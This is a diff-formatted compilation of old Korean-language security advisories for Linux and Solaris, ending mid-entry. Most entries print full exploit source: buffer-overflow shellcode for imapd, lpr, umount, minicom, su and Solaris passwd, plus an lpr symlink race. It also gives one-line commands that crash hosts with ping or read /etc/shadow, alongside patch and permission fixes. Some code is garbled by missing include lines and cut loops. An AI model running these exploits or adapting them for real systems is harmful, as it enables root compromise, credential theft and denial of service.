+        Linux (RedHat), Slackware 3.2
+
+문제점
+
+        로컬 호스트는 물론 리모트 사용자 까지 침입할 수 있는 보안상 헛점이
+        발견되었다. imapd데몬을 공격하는 것이다.
+        최근에 imapd 데몬의 문제점이 또하나 발견되었다.
+
+    #include
+    #include
+    #include
+    #include
+    #include
+    #include
+    #include
+
+    char *h_to_ip(char *hostname);
+
+    char *h_to_ip(char *hostname) {
+
+      struct hostent *h;
+      struct sockaddr_in tmp;
+      struct in_addr in;
+
+      h = gethostbyname(hostname);
+
+      if (h==NULL) { perror("Resolving the host. \n"); exit(-1); }
+
+      memcpy((caddr_t)&tmp.sin_addr.s_addr, h->h_addr, h->h_length);
+      memcpy(&in,&tmp.sin_addr.s_addr,4);
+
+    return(inet_ntoa(in));
+    }
+
+    void banner(void) {
+      system("clear");
+      printf("\nIMAP Exploit for Linux.\n");
+      printf("\n\tAuthor: Akylonius (aky@galeb.etf.bg.ac.yu)\n");
+
+      printf(" Modifications: p1 (p1@el8.org)\n");
+    }
+
+    main(int argc, char **argv) {
+
+      int fd;
+      struct sockaddr_in sckdaddr;
+      char *hostname;
+      char buf[4092];
+      int i=8;
+      char realegg[] =
+        "\xeb\x58\x5e"
+        "\x31\xdb\x83\xc3\x08\x83\xc3\x02\x88\x5e\x26"
+        "\x31\xdb\x83\xc3\x23\x83\xc3\x23\x88\x5e\xa8"
+        "\x31\xdb\x83\xc3\x26\x83\xc3\x30\x88\x5e\xc2"
+        "\x31\xc0\x88\x46\x0b\x89\xf3\x83\xc0\x05\x31"
+        "\xc9\x83\xc1\x01\x31\xd2\xcd\x80\x89\xc3\x31"
+        "\xc0\x83\xc0\x04\x31\xd2\x88\x56\x27\x89\xf1"
+        "\x83\xc1\x0c\x83\xc2\x1b\xcd\x80\x31\xc0\x83"
+        "\xc0\x06\xcd\x80\x31\xc0\x83\xc0\x01\xcd\x80"
+        "iamaselfmodifyingmonsteryeahiam\xe8\x83\xff\xff\xff"
+
+        "/etc/passwdxroot::0:0:r00t:/:/bin/bashx";
+      char *point = realegg;
+      buf[0]='*';
+      buf[1]=' ';
+      buf[2]='l';
+
+      buf[3]='o';
+      buf[4]='g';
+      buf[5]='i';
+      buf[6]='n';
+      buf[7]=' ';
+
+      banner();
+
+      if (argc<2)  {
+         printf("\nUsage: %s \n\n", argv[0]);
+         exit(-1);
+      }
+
+      hostname=argv[1];
+
+      while(i<1034-sizeof(realegg) -1) /* -sizeof(realegg)+1) */
+        buf[i++]=0x90;
+
+      while(*point)
+        buf[i++]=*(point++);
+
+      buf[i++]=0x83; /* ebp */
+      buf[i++]=0xf3;
+      buf[i++]=0xff;
+      buf[i++]=0xbf;
+      buf[i++]=0x88; /* ret adr */
+      buf[i++]=0xf8;
+      buf[i++]=0xff;
+      buf[i++]=0xbf;
+
+      buf[i++]=' ';
+      buf[i++]='b';
+      buf[i++]='a';
+      buf[i++]='h';
+      buf[i++]='\n';
+
+      buf[i++]=0x0;
+
+
+      if ((fd=socket(AF_INET,SOCK_STREAM,0))<0) perror("Error opening the
+socket. \n");
+
+      sckdaddr.sin_port=htons(143);
+      sckdaddr.sin_family=AF_INET;
+      sckdaddr.sin_addr.s_addr=inet_addr(h_to_ip(hostname));
+
+      if (connect(fd,(struct sockaddr *) &sckdaddr, sizeof(sckdaddr)) < 0)
+    perror("Error with connecting. \n");
+
+      printf("hmm: \n");
+      getchar();
+
+      write(fd,buf,strlen(buf)+1);
+      printf("hmm: \n");
+      close(fd);
+    }
+
+        이것은 상당히 위험한 소스로써 원하는 호스트에 적당한 조건만
+        생기면 루트 권한을 아주 쉽게 만들어낼수 있다.
+        /etc/passwd 파일안에 xroot::0:0:~~:/:/bin/sh 라는 종류의
+        내용이 들어가게된다.
+
+해결책
+
+        래드햇 4.0 사용자는 래드햇 4.1에 있는 패키지나 4.2에 있는 패키지로
+        업그레이드를 하고 래드햇 2.0은 그냥 지워라. rpm -e imap
+        슬랙웨어 사용자또한 패치를 해라
+        모든 패치를 하기 싫으면 지우는 게 상책이다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 ping버그
+명령
+
+    kernel(ping)
+
+시스템
+
+    리눅스 커널
+    SunOS
+    HP
+
+문제
+
+        ping -l 65510 host.running.linux
+
+        리부팅 시킨다.. 어떤 유저든지.
+
+해결
+
+        커널을 업한다. 2.0.30 으로..
+
+---------------------------
+
+ 제  목: [보안] 리눅스 라이브러리(5.4.7)
+명령
+
+        libc.so
+
+시스템
+
+        Linux (using libc.so older than 5.4.7)
+
+문제점
+
+        환경 변수를 조작해서 어떤 파일이든지 읽을 수 있다.
+
+        export RESOLV_HOST_CONF=/etc/shadow; ssh asdf
+        export RESOLV_HOST_CONF=/etc/shadow; ping asdf
+        export RESOLV_HOST_CONF=/etc/shadow; finger asdf
+        export RESOLV_HOST_CONF=/etc/shadow; traceroute asdf
+
+해결
+        새로운 버젼의 라이브러리를 인스톨 한다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 lpr
+명령
+
+        lpr
+
+시스템
+
+        Linux
+
+문제점
+
+        lpr 을 이용해서 기존의 파일을 덮어 씌우던지 새롭게 생성할 수 있다.
+
+    #!/bin/csh -f
+    #
+    # Usage: lprcp from-file to-file
+    #
+
+    if ($#argv != 2) then
+        echo Usage: lprcp from-file to-file
+        exit 1
+    endif
+
+    # This link stuff allows us to overwrite unreadable files,
+
+    # should we want to.
+    echo x > /tmp/.tmp.$$
+    lpr -q -s /tmp/.tmp.$$
+    rm -f /tmp/.tmp.$$          # lpr's accepted it, point it
+    ln -s $2 /tmp/.tmp.$$           # to where we really want
+
+    @ s = 0
+    while ( $s != 999)          # loop 999 times
+        lpr /nofile >&/dev/null # doesn't exist, but spins the clock!
+        @ s++
+        if ( $s % 10 == 0 ) echo -n .
+    end
+    lpr $1                      # incoming file
+                                # user becomes owner
+    rm -f /tmp/.tmp.$$
+    exit 0
+
+해결
+
+        궁여지책으로 755 로 할수 있으나 그래도 심볼릭 링크를 생성하는
+        보안상 헛점이 있으므로 700모드로 해두어라.
+        최신 판의 lpr을 인스톨 하거나 lpr wrapper을 설치하면된다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 lpr (2)
+명령
+
+        lpr
+
+시스템
+
+        Linux 2.0.20 (others?)
+
+문제점
+
+        버퍼 오버플로어를 이용해서 루트를 얻을 수 있다.
+
+
+#include
+#include
+#include
+
+#define DEFAULT_OFFSET          50
+#define BUFFER_SIZE             1023
+
+long get_esp(void)
+{
+   __asm__("movl %esp,%eax\n");
+
+}
+
+void main()
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+
+   u_char execshell[] =
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
+
+"\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
+"\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
+                        "\xd7\xff\xff\xff/bin/sh";
+   int i;
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+
+   }
+   ptr = buff;
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+   for(i=0;i
+#include
+
+/*
+ * Make sure REAL_LPR points to the location you copied lpr to in
+ * step #4.
+ */
+
+#define REAL_LPR "/usr/bin/lpr.real"
+
+
+
+main(argc,argv,envp)
+int     argc;
+char    *argv[];
+char    *envp[];
+{
+        int     ct;
+
+        for (ct=1;ct BUFSIZ)
+                {
+                        fprintf(stderr,"You have exceeded the argument
+length ...Exiting\n");
+#ifdef SYSLOG
+                        syslog(LOG_ERR,"Possible lpr buffer overrun attack
+by uid %d\n",getuid());
+#endif
+                        exit(1);
+                }
+        }
+        execve(REAL_LPR,argv,envp);
+        perror("execve lpr failed");
+}
+
+---------------------------
+
+ 제  목: [보안] 리눅스 lpr (3)
+
+명령
+
+        lpr
+
+시스템
+
+        linux 2.1.5 kernel, slackware 96 distribution
+
+문제점
+
+        어처구니 없는 일이다.
+        설치된 상태 그대로 놔두면 그냥 해킹당한다. 조심하라.
+
+        Loveyou# uname -a
+        Linux ieee 2.1.5 #3 Sat Oct 19 13:34:54 EST 1986 i486
+        Loveyou# ./lpr
+        bash# id
+        uid=(503)security gid=100(users) euid=0(root) egid=7(lp)
+        groups=100(users)
+        bash#
+
+해결책
+
+        새로운 버젼의 lpr을 가져다 놓던지 700 모드로 해두어라
+
+---------------------------
+
+ 제  목: [보안] 리눅스 libXt
+명령
+
+        libXt
+
+시스템
+
+        RedHat 4.0, 4.1, 4.2
+
+문제점
+
+        libXt의 문제가 되는 프로그램이다. 상당히 위험한 수준이므로 소스코드는
+        공개하지 않겠다.
+        버퍼 오버 플로우를 일으킬수 있으며 버그 패치를 하지 않는 서버는 위험
+        한 수준으로 올라간다.
+
+
+해결
+
+    셋유저 아이디가 있는 프로그램을 찾아서 모두 755 모드로..
+
+        $ cd /usr/X11/bin
+        $ find . -type f -a \( -perm -2000 -o -perm -4000 \) -print
+
+        $ find . -type f -a \( -perm -2000 -o -perm -4000 \) -print
+
+    아래의 해당 사이트에 가서 새로운 버그 패치판을 구해 와서 깔면 된다.
+
+    o Red Hat Linux/Alpha 4.1, 4.2
+
+ftp://ftp.redhat.com/updates/4.2/alpha/XFree86-devel-3.2-10.alpha.rpm
+
+ftp://ftp.redhat.com/updates/4.2/alpha/XFree86-libs-3.2-10.alpha.rpm
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/XFree86-devel-3.$
+
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/XFree86-libs-3.2$
+
+
+    o Red Hat Linux/Intel 4.0, 4.1, 4.2
+ftp://ftp.redhat.com/updates/4.2/i386/XFree86-devel-3.2-10.i386.rpm
+        ftp://ftp.redhat.com/updates/4.2/i386/XFree86-libs-3.2-10.i386.rpm
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/XFree86-devel-3.$
+
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/XFree86-libs-3.2$
+
+
+    o Red Hat Linux/SPARC 4.0, 4.1, 4.2
+
+
+ftp://ftp.redhat.com/updates/4.2/sparc/X11R6.1-devel-pl1-21.sparc.rpm
+
+ftp://ftp.redhat.com/updates/4.2/sparc/X11R6.1-libs-pl1-21.sparc.rpm
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/X11R6.1-devel-pl$
+
+
+ftp://ftp.aoy.com/pub/Linux/security/DISTRIBUTION-FIXES/RedHat/X11R6.1-libs-pl1$
+
+---------------------------
+
+ 제  목: [보안] 리눅스 minicom
+명령
+
+        usr/bin/minicom (1.75)
+
+시스템
+
+        슬랙웨어 3.1 과 래드햇 4.1    외.. 다수
+
+문제
+
+        미니 콤 이라는 통신 프로그램에 어떤 문제가 있음을 말한다.
+        버퍼 오버플로우를 일으켜서 그룹 id(uucp)를 얻는다.
+
+
+/* this stack overflow exploit code was written by jsn
+*/
+/* provided "as is" and without any warranty. Sun Feb  9 08:12:54 MSK 1997
+*/
+/* usage: argv[0] their_stack_offset buffer_size target_program [params]
+*/
+/* generated string will be appended to the last of params.
+*/
+/* examples: stack -600 1303 /usr/bin/lpr "-J"
+*/
+/*           stack -640 153  /usr/bin/minicom -t vt100 -d ""
+*/
+
+#include
+#include
+#include
+#include
+#include
+
+#define NOP     0x90
+const char usage[] = "usage: %s stack-offset buffer-size argv0 argv1
+...\n";
+
+extern          code();
+void    dummy( void )
+{
+        extern  lbl();
+
+        /* do "exec( "/bin/sh" ); exit(0)" */
+__asm__( "
+code:   xorl    %edx, %edx
+        pushl   %edx
+        jmp     lbl
+start2: movl    %esp, %ecx
+        popl    %ebx
+        movb    %edx, 0x7(%ebx)
+        xorl    %eax, %eax
+        movb    $0xB, %eax
+        int     $0x80
+        xorl    %ebx, %ebx
+        xorl    %eax, %eax
+        inc     %eax
+        int     $0x80
+lbl:    call    start2
+        .string \"/bin/sh\"
+ ");
+}
+
+void            Fatal( int rv, const char *fmt, ... )
+{
+        va_list         vl;
+        va_start( vl, fmt );
+        vfprintf( stderr, fmt, vl );
+        va_end( vl );
+        exit( rv );
+}
+
+int             main( int ac, char **av )
+{
+        int             buff_addr;      /* where our code is */
+        int             stack_offset = 0,
+                        buffer_size = 0, i, code_size;
+        char            *buffer, *p;
+
+        buff_addr = (int)(&buff_addr);          /* get the stack pointer
+*/
+        code_size = strlen( (char *)code );     /* get the size of piece
+of */
+                                                /* code in dummy()      */
+
+        if( ac < 5 )    Fatal( -1, usage, *av );
+
+        buff_addr -= strtol( av[ 1 ], NULL, 0 );
+        buffer_size = strtoul( av[ 2 ], NULL, 0 );
+
+        if( buffer_size < code_size + 4 )
+            Fatal( -1, "buffer is too short -- %d minimum.\n", code_size +
+5);
+            /* "this is supported, but not implemented yet" ;) */
+
+        if( (buffer = malloc( buffer_size )) == NULL )
+            Fatal( -1, "malloc(): %s\n", strerror( errno ) );
+
+        fprintf( stderr, "using buffer address 0x%8.8x\n", buff_addr );
+
+        for( i = buffer_size - 4; i > buffer_size / 2; i -= 4 )
+                *(int *)(buffer + i) = buff_addr;
+
+        memset( buffer, NOP, buffer_size/2 );
+
+        i = (buffer_size - code_size - 4)/2;
+
+        memcpy( buffer + i, (char *)code, code_size );
+        buffer[ buffer_size - 1 ] = '\0';
+
+        p = malloc( strlen( av[ ac - 1 ] ) + code_size + 1 );
+        if( !p )
+            Fatal( -1, "malloc(): %s\n", strerror( errno ) );
+
+        strcpy( p, av[ ac - 1 ] );
+        strcat( p, buffer );
+        av[ ac - 1 ] = p;
+
+        execve( av[ 3 ], av + 3, NULL );
+        perror( "exec():" );
+
+}
+
+
+SOLUTION
+
+        755 모드로 해놓아도 어떤 지장이 없다.
+        chmod 755 `which minicom`
+
+---------------------------
+
+ 제  목: [보안] 리눅스 mount,umount
+명령
+
+        mount-umount
+
+시스템
+
+        RedHat Linux
+
+문제점
+
+        마운트 명령은 과거부터 계속 문제가 되어 왔던 프로그램으로.. 대부분은
+        700모드로 놔둔다.. 그것이 상책이다.
+        이는 버퍼 오버플로우를 보여준다.
+
+#include
+#include
+#include
+#include
+
+#include
+#include
+
+#define PATH_MOUNT "/bin/umount"
+#define BUFFER_SIZE 1024
+#define DEFAULT_OFFSET 50
+
+u_long get_esp()
+{
+  __asm__("movl %esp, %eax");
+
+}
+
+main(int argc, char **argv)
+{
+  u_char execshell[] =
+   "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+
+   "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+   "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+   int i;
+   int ofs = DEFAULT_OFFSET;
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+   }
+   ptr = buff;
+
+   /* fill start of buffer with nops */
+
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+
+   /* stick asm code into the buffer */
+
+   for(i=0;i
+    #include
+
+    #include
+
+    char *shellcode =
+
+"\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
+
+"\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
+
+"\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
+      "\xcd\x80/"
+      "/bin/sh"
+      "0";
+
+    char *get_sp() {
+       asm("movl %esp,%eax");
+    }
+
+    #define bufsize 2048
+    char buffer[bufsize];
+
+    main() {
+      int i;
+
+      for (i = 0; i < bufsize - 4; i += 4)
+        *(char **)&buffer[i] = get_sp() - 3072;
+
+      memset(buffer, 0x90, 512);
+      memcpy(&buffer[512], shellcode, strlen(shellcode));
+
+      buffer[bufsize - 1] = 0;
+
+      setenv("NLSPATH", buffer, 1);
+
+      execl("/bin/su", "/bin/su", NULL);
+
+   }
+
+해결책
+
+        libc를 업그레이드 시켜라
+
+---------------------------
+
+ 제  목: [보안] 솔라리스 (nis,yp) passwd
+명령
+
+        (nis,yp)passwd
+
+시스템
+
+        솔라리스 2.X
+
+문제점
+
+        -s 옵션상의 문제다.
+        다음과 같은 오버 플로우 방법으로 루트권한을 획득한다.
+
+        솔라리스 2.5.(1) 버젼.
+
+
+#include
+#include
+#include
+#include
+
+#define BUF_LENGTH      1100
+#define EXTRA           1200
+#define STACK_OFFSET    3800
+#define SPARC_NOP       0xa61cc013
+
+u_char sparc_shellcode[] =
+" 코드 " ;
+
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode),dso=0;
+
+  if(argc > 1) dso=atoi(argv[1]);
+
+  long_p =(u_long *)  buf;
+    targ_addr = get_sp() - STACK_OFFSET - dso;
+
+  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+    *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i < code_length; i++)
+    *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+
+
+  for (i = 0; i < EXTRA / sizeof(u_long); i++)
+    *long_p++ =targ_addr;
+
+  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+  targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+  execl("/bin/passwd", "passwd", buf,(char *) 0);
+  perror("execl failed");
+}
+
+
+        솔라리스 2.4 버젼
+#include
+#include
+#include
+#include
+
+#define BUF_LENGTH      600
+#define EXTRA           600
+#define STACK_OFFSET    1400
+#define SPARC_NOP       0xa61cc013
+
+u_char sparc_shellcode[] ="쉘 코드 ";
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA + 8];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode),dso=0;
+
+  if(argc > 1) dso=atoi(argv[1]);
+
+  long_p =(u_long *)  buf ;
+    targ_addr = get_sp() - STACK_OFFSET - dso;
+
+  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+    *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i < code_length; i++)
+    *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+
+
+  for (i = 0; i < EXTRA / sizeof(u_long); i++)
+    *long_p++ =targ_addr;
+
+  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+  targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+  execl("/bin/passwd", "passwd", & buf[1],(char *) 0);
+  perror("execl failed");
+}
+
+
+해결책
+        선 사이트에 가서 패치하라.
+       OS version      Patch ID
+        ----------      --------
+        SunOS 5.5.1     104433-03
+        SunOS 5.5.1_x86 104434-02
+        SunOS 5.5       103178-03
+        SunOS 5.5_x86   103179-03
+        SunOS 5.4       101945-49    (to be released in 5 weeks from 29/04/1997)
+
+        SunOS 5.4_x86   101946-43    (to be released in 5 weeks from 29/04/1997)
+
+        SunOS 5.3       101318-87    (to be released in 6 weeks from 29/04/1997)
+
+
+        아니면 오버플로우 와퍼를 구해서 깔아라.
+
+        ftp ://ftp.auscert.org.au/pub/auscert/tools/overflow_wrapper.c
+
+---------------------------
+
+ 제  목: [보안] 솔라리스 ping (1)
+명령
+
+        ping
+
+시스템
+
+        솔라리스 2.X
+
+문제점
+
+        ping 으로 솔라리스를 리부팅할수 있다. 어떤 유저든지
+
+        ping -sv -i 127.0.0.1 224.0.0.1
+
+해결책
+
+        OS version      Patch ID
+        __________      ________
+        SunOS 5.5.1     103630-09
+        SunOS 5.5.1_x86 103631-09
+        SunOS 5.5       103169-12
+        SunOS 5.5_x86   103170-12
+        SunOS 5.4       101945-52   (to be released)
+        SunOS 5.4_x86   101946-46   (to be released)
+        SunOS 5.3       101318-89   (to be released)
+
+        아니면 솔라리스 패치가 자주 나오는
+
+
+        ftp://sunsolve1.sun.com/pub/patches
+        에 가서 패치 버젼을 가져와라.
+
+---------------------------
+
+ 제  목: [보안] 솔라리스 rsh
+명령
+
+        rsh
+
+시스템
+        솔라리스 2.4 2.5.1
+
+문제점
+        rshd 와 같은 것을 이용해서 루트 소유의 소켓을 건드릴수 있다.
+
+        cc solarisuck.c -o solarisuck -lsocket
+        rsh localhost ./solarisuck
+
+        solaisuck.c 소스
+#include
+#include
+#include
+#include
+#include
+#include
+
+int main(int argc, char *argv[])
+{
+        struct ifreq please_break_me;
+
+        strcpy( please_break_me.ifr_name, "lo0");
+        please_break_me.ifr_flags=0;
+
+        if(ioctl(0, SIOCSIFFLAGS, &please_break_me)==-1)
+                perror("Damn it didnt work. Obviously not Solaris ;)");
+}
+
+
+
+해결책
+        쓸필요 없는 rshd 데몬을 죽여놓자. (/etc/inetd.conf참조)
+        Patch 103093(솔라리스2.5용)로 패치해도 되지만 어떤 문제점이
+        제기되었다.
+
+---------------------------
+
+ 제  목: [보안] 솔라리스 lp,lpsched
+명령
+        lp, lpsched
+
+시스템
+
+        솔라리스 2.4 2.5 2.5.1
+
+문제점
+
+        lp 를 이용해서 /var/tmp에 생성되는 임시 파일을 다른 파이로
+        링크 시켜서 놓으면 모드 666 이고 lp 소유권의 파일을 생성
+        할 수 있다.
+
+        그 예..
+            #!/bin/sh
+    #
+    # lpNet & temp file exploit:
+    #   break lp, then use lp priv to break root (or bin, etc...).
+    #
+    #   Written by: Chris Sheldon (csh@viewgraphics.com)
+    #
+    #   Tested on Solaris-2.5.1:
+    #     SunOS testhost 5.5.1 Generic sun4m sparc SUNW,SPARCstation-20
+    #
+    #   Caveat: This system is running without patches. Sun released
+    #     patch 103959-03 for 2.5.1 on Feb 27, 1997. lpNet and lpsched
+    #     were replaced in that patch, but the patch README does
+
